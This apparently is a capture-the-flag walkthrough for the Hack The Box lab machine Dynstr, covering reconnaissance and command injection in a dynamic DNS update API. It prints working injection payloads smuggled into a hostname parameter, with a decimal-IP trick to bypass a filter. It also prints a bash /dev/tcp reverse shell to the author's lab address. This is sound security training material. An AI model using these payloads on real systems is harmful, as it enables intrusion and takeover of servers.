@@ -1,0 +1,793 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Dynstr</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-dynstr">htb-dynstr</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#dynamic-dns">dynamic-dns</a> <a class="post-tag" href="/tags#no-ip">no-ip</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#dnsenum">dnsenum</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#cyberchef">cyberchef</a> <a class="post-tag" href="/tags#scriptreplay">scriptreplay</a> <a class="post-tag" href="/tags#dns">dns</a> <a class="post-tag" href="/tags#nsupdate">nsupdate</a> <a class="post-tag" href="/tags#authorized-keys">authorized-keys</a> <a class="post-tag" href="/tags#wildcard">wildcard</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#bash">bash</a> <a class="post-tag" href="/tags#passwd">passwd</a> <a class="post-tag" href="/tags#oscp-plus-v2">oscp-plus-v2</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-10-16T13:45:00+00:00" itemprop="datePublished">Oct 16, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/10/16/htb-dynstr.html" style="color: #e6e6e6; text-decoration: none;">HTB: Dynstr</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/dynstr-cover.webp" type="image/webp"/>
+<img alt="Dynstr" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/dynstr-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Dynstr was a super neat concept based around a dynamic DNS provider. To start, I’ll find command injection in the DNS / IP update API. Then I’ll find a private key in a script replay of a debugging session and strace logs. I’ll also need to tinker with the DNS resolutions to allow myself to connect over SSH, as the authorized_keys file has restrictions in it. For root, there’s a simple wildcard injection into a script I can run as root, and I’ll show two ways to exploit that. In Beyond Root, a break down of the DNS API, and a look at an unintended flag leak and a dive into Bash variables and number comparisons.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/352 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/dynstr" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Dynstr</a> <a href="https://hackthebox.com/machines/dynstr" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-dynstr.webp" type="image/webp"/> <img alt="Dynstr" class="img-av" src="/icons/box-dynstr.png"/></picture></a><br/><a href="https://hackthebox.com/machines/dynstr" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1402642148374290433">12 Jun 2021</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">16 Oct 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/dynstr-diff.webp" type="image/webp"/><img alt="Rated difficulty for Dynstr" src="/img/dynstr-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/dynstr-radar.webp" type="image/webp"/><img alt="Radar chart for Dynstr" src="/img/dynstr-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:42:23</span><a href="https://app.hackthebox.com/users/52045" rel="noopener" target="_blank"><img alt="InfoSecJack" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/52045" style="display: unset"/><span class="user-text" style="display: none"> InfoSecJack</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:44:55</span><a href="https://app.hackthebox.com/users/52045" rel="noopener" target="_blank"><img alt="InfoSecJack" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/52045" style="display: unset"/><span class="user-text" style="display: none"> InfoSecJack</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found three open TCP ports, SSH (22), DNS (53), and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.244
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 06:12 EDT
+Nmap scan report for 10.10.10.244
+Host is up (1.7s latency).
+Not shown: 63812 filtered ports, 1720 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 224.94 seconds
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,53,80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.244
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 06:20 EDT
+Nmap scan report for 10.10.10.244
+Host is up (0.022s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
+|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
+|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Dyna DNS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu Focal 20.04.</p>
+<p>Unsurprisingly given DNS is running on TCP, it is also open on UDP as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-p</span> 53 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-udp-dns 10.10.10.244
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 06:26 EDT
+Nmap scan report for 10.10.10.244
+Host is up (0.016s latency).
+
+PORT   STATE SERVICE VERSION
+53/udp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
+</span></code></pre></div></div>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for Dyna DNS, a dynamic DNS provider:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210613063354567.png">
+<img alt="image-20210613063354567" src="https://0xdfimages.gitlab.io/img/image-20210613063354567.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20210613063354567.png"><i>Click for full image</i></a></div>
+</div>
+<p>I’ve added boxes around four bits of information.</p>
+<ul>
+<li>They use the same API as no-ip.com.</li>
+<li>They provide DNS for <code class="language-plaintext highlighter-rouge">dnsalias.htb</code>, <code class="language-plaintext highlighter-rouge">dynamicdns.htb</code>, and <code class="language-plaintext highlighter-rouge">no-ip.htb</code>.</li>
+<li>Currently in Beta, all customers are using the shared credentials, dynadns / sndanyd.</li>
+<li>There’s a contact email, <code class="language-plaintext highlighter-rouge">dns@dyna.htb</code>.</li>
+</ul>
+<p><a href="https://www.noip.com/">no-ip</a> offers dynamic DNS services. Their customers get a subdomain on one of many domains they host from, and can install a client that talks to the API to update that subdomain frequently so that if the IP where the client is running changes, the DNS will update as well.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.244
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.2.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.244
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.2.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      313c http://10.10.10.244/assets
+</span><span class="feroxbuster-red">403</span><span class="go">        9l       28w      277c http://10.10.10.244/server-status
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      319c http://10.10.10.244/assets/fonts
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      316c http://10.10.10.244/assets/js
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      310c http://10.10.10.244/nic
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      317c http://10.10.10.244/assets/img
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      317c http://10.10.10.244/assets/css
+</span><span class="feroxbuster-green">200</span><span class="go">        1l        1w        8c http://10.10.10.244/nic/update
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      320c http://10.10.10.244/assets/img/bg
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      326c http://10.10.10.244/assets/img/overlays
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      322c http://10.10.10.244/assets/img/logo
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m    299990/299990  0s      </span><span class="feroxbuster-green">found</span><span class="go">:11      </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 18s    29999/29999   1626/s  http://10.10.10.244
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 24s    29999/29999   1254/s  http://10.10.10.244/assets
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 27s    29999/29999   1114/s  http://10.10.10.244/assets/fonts
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 29s    29999/29999   1010/s  http://10.10.10.244/assets/js
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 30s    29999/29999   998/s   http://10.10.10.244/nic
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 30s    29999/29999   983/s   http://10.10.10.244/assets/img
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 30s    29999/29999   998/s   http://10.10.10.244/assets/css
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 24s    29999/29999   1223/s  http://10.10.10.244/assets/img/bg
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 22s    29999/29999   1346/s  http://10.10.10.244/assets/img/overlays
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 22s    29999/29999   1340/s  http://10.10.10.244/assets/img/logo
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">assets</code> is just stuff related to the website. <code class="language-plaintext highlighter-rouge">/nic</code>  and <code class="language-plaintext highlighter-rouge">/nic/update</code> are interesting.</p>
+<h3 id="dns---udptcp-53">DNS - UDP/TCP 53</h3>
+<p>With DNS on TCP open, I’ll try zone transfers on each of the domains I know about, but without any luck (example for <code class="language-plaintext highlighter-rouge">dyna.htb</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>dig axfr dyna.htb @10.10.10.244
+<span class="go">
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr dyna.htb @10.10.10.244
+;; global options: +cmd
+; Transfer failed.
+</span></code></pre></div></div>
+<p>I can try to brute subdomains across the different domains using <code class="language-plaintext highlighter-rouge">dnsenum</code>. I actually found one on <code class="language-plaintext highlighter-rouge">no-ip.htb</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>dnsenum <span class="nt">--dnsserver</span> 10.10.10.244 <span class="nt">-f</span> /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt <span class="nt">-o</span> scans/dnsenum-no-ip.htb-bitquark no-ip.htb
+<span class="go">dnsenum VERSION:1.2.6
+...[snip]...
+Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
+________________________________________________________________________________________
+
+test.no-ip.htb.                          30       IN    A        10.10.14.7
+...[snip]...
+</span></code></pre></div></div>
+<p>This domain is pointing at another player’s IP, so I’ll leave it alone. It is a sign that I’ll be able to set IPs at some point (which fits the theme of the site).</p>
+<h3 id="api">API</h3>
+<h4 id="discovery">Discovery</h4>
+<p>The first link when Googling “no-ip api” has a page that leads to the API documentation at https://www.noip.com/integrate/request.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210613135249803.webp" type="image/webp"/>
+<img alt="image-20210613135249803" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210613135249803.png"/>
+</picture>
+<p>Those match up nicely with what I found with <code class="language-plaintext highlighter-rouge">feroxbuster</code>.  Later it gives this example with auth:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25
+</code></pre></div></div>
+<h4 id="try-it">Try It</h4>
+<p>I can try that on Dynstr. I’ve got the shared credentials from the webpage above, so I’ll include those. Without an <code class="language-plaintext highlighter-rouge">ip</code> arg, it sets the domain to my IP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname<span class="o">=</span>0xdf.no-ip.htb
+<span class="go">good 10.10.14.8
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>dig +short 0xdf.no-ip.htb @10.10.10.244
+<span class="go">10.10.14.8
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">myip</code> arg will set it to some other IP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=0xdf.no-ip.htb&amp;myip=10.10.14.10'</span>
+<span class="go">good 10.10.14.10
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>dig +short 0xdf.no-ip.htb @10.10.10.244
+<span class="go">10.10.14.10
+</span></code></pre></div></div>
+<p>It even works with IPs outside of <code class="language-plaintext highlighter-rouge">10.0.0.0/8</code>.</p>
+<p>If I try to update one of the base domains, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname<span class="o">=</span>no-ip.htb
+<span class="go">911 [wrngdom: htb]
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">wrngdom</code> message is likely “wrong domain”. If I try a longer one that’s not one of the listed domains, it fails as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname<span class="o">=</span>0xdf.ano-ip.htb
+<span class="go">911 [wrngdom: ano-ip.htb]
+</span></code></pre></div></div>
+<p>The “domain” here must be all but the first word before the first <code class="language-plaintext highlighter-rouge">.</code>.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="command-injection-strategy">Command Injection Strategy</h3>
+<p>When thinking about how to attack a webserver like this, it’s useful to think about what server is doing with my input. The way to update a DNS resolution on Bind is typically with <code class="language-plaintext highlighter-rouge">nsupdate</code>, which means that the webpage is likely calling that as a system command, and that leave open the possibility for command injections.</p>
+<h3 id="testing-api">Testing API</h3>
+<p>I’ll start with a couple simple payloads, <code class="language-plaintext highlighter-rouge">;id</code> (to see if any output came back) and <code class="language-plaintext highlighter-rouge">;ping -c 1 10.10.14.8</code> to see if there’s a blind injection. I’ll also use <code class="language-plaintext highlighter-rouge">curl</code> with the <code class="language-plaintext highlighter-rouge">--data-urlencode</code> parameter to pass GET parameters that it encodes for me.</p>
+<p>Both return <code class="language-plaintext highlighter-rouge">wrngdom</code> errors:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=;id'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+<span class="go">911 [wrngdom: ]
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=;ping -c 1 10.10.14.8'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+<span class="go">911 [wrngdom: 10.14.8]
+</span></code></pre></div></div>
+<p>The first doesn’t give a domain, but the second gives 10.14.8. It looks like it’s looking for the first <code class="language-plaintext highlighter-rouge">.</code>, and considering the stuff after it the domain, just like I noticed above. I can test this, and it looks right:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=a.b.c.d.e.f.g.h.i'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+<span class="go">911 [wrngdom: b.c.d.e.f.g.h.i]
+</span></code></pre></div></div>
+<p>I’ve got the list of domains from the website. I’ll try adding something to the end of the injection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=;id;0xdf.no-ip.htb'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+<span class="go">911 [nsupdate failed]
+</span></code></pre></div></div>
+<p>That’s good confirmation that it’s using <code class="language-plaintext highlighter-rouge">nsupdate</code>, and the fact that I broke it is a good sign that the injection is working.</p>
+<h3 id="command-injection-pocs">Command Injection POCs</h3>
+<h4 id="whoami">whoami</h4>
+<p>I’d like to add a comment after the domain, but then it won’t pass the domain check. I’ll switch from using <code class="language-plaintext highlighter-rouge">;</code> to end the command to using <code class="language-plaintext highlighter-rouge">$()</code> to run a subcommand:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=$(whoami).no-ip.htb'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+<span class="go">good 10.10.14.8
+</span></code></pre></div></div>
+<p>I chose <code class="language-plaintext highlighter-rouge">whoami</code> because it was more likely to work returning a single word vs <code class="language-plaintext highlighter-rouge">id</code>. It seems to have worked. If the web process is running as www-data, then <code class="language-plaintext highlighter-rouge">www-data.no-ip.htb</code> would resolve to my IP. It does:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>dig +short www-data.no-ip.htb @10.10.10.244
+<span class="go">10.10.14.8
+</span></code></pre></div></div>
+<p>That’s proof of command injection.</p>
+<h4 id="ping">ping</h4>
+<p>An easier check would be to try <code class="language-plaintext highlighter-rouge">ping</code>. The only challenge is that I can’t use <code class="language-plaintext highlighter-rouge">.</code>. That’s easily bypassed knowing that an IP is just a four-byte integer. It’s standard to represent it as four ints 0-255 combined with <code class="language-plaintext highlighter-rouge">.</code>, but almost all systems will handle the int value as well. <a href="https://gchq.github.io/CyberChef/#recipe=Change_IP_format('Dotted%20Decimal','Decimal')&amp;input=MTAuMTAuMTQuOA">Cyberchef</a> has a Change IP Format recipe that works nicely here:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210613144052430.webp" type="image/webp"/>
+<img alt="image-20210613144052430" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210613144052430.png"/>
+</picture>
+<p>Dropping that in, with <code class="language-plaintext highlighter-rouge">tcpdump</code> watching locally, I can <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=$(ping -c 1 168431112).no-ip.htb'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+<span class="go">911 [nsupdate failed]
+</span></code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+14:41:19.902625 IP 10.10.10.244 &gt; 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
+14:41:19.902652 IP 10.10.14.8 &gt; 10.10.10.244: ICMP echo reply, id 1, seq 1, length 64
+14:41:19.929024 IP 10.10.10.244 &gt; 10.10.14.8: ICMP echo request, id 2, seq 1, length 64
+14:41:19.929042 IP 10.10.14.8 &gt; 10.10.10.244: ICMP echo reply, id 2, seq 1, length 64
+</span></code></pre></div></div>
+<p>That’s actually two pings, so the injection must have taken place twice.</p>
+<h3 id="shell">Shell</h3>
+<p>To get a shell, I’ll use the standard Bash reverse shell, just using my IP in decimal form:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'hostname=$(/bin/bash -c "bash -i &gt;&amp; /dev/tcp/168431112/443 0&gt;&amp;1").no-ip.htb'</span> <span class="s1">'http://dynadns:sndanyd@10.10.10.244/nic/update'</span>
+</code></pre></div></div>
+<p>It hangs, but at a listening <code class="language-plaintext highlighter-rouge">nc</code>, there’s a shell as www-data (as expected):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.244] 37680
+bash: cannot set terminal process group (716): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@dynstr:/var/www/html/nic$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>I’ll upgrade the shell using the standard trick with Python:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/var/www/html/nic$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="go">python3 -c 'import pty;pty.spawn("bash")'
+</span><span class="gp">www-data@dynstr:/var/www/html/nic$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@dynstr:/var/www/html/nic$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-bindmgr">Shell as bindmgr</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="users">Users</h4>
+<p>There are two users on the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">bindmgr  dyna
+</span></code></pre></div></div>
+<p>There isn’t much interesting in <code class="language-plaintext highlighter-rouge">dyna</code>. <code class="language-plaintext highlighter-rouge">bindmgr</code> has <code class="language-plaintext highlighter-rouge">user.txt</code>, and a directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 36
+drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
+drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
+lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
+drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
+-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
+-r-------- 1 bindmgr bindmgr   33 Jun  9 11:50 user.txt
+
+</span></code></pre></div></div>
+<p>I can’t read <code class="language-plaintext highlighter-rouge">user.txt</code> yet, but I can access <code class="language-plaintext highlighter-rouge">support-case-C62796521</code>. There’s also a <code class="language-plaintext highlighter-rouge">.ssh</code> directory.</p>
+<h4 id="ssh">.ssh</h4>
+<p><code class="language-plaintext highlighter-rouge">.ssh</code> contains four files I would expect to see:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dynstr:/home/bindmgr/.ssh$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">authorized_keys  id_rsa  id_rsa.pub  known_hosts
+</span></code></pre></div></div>
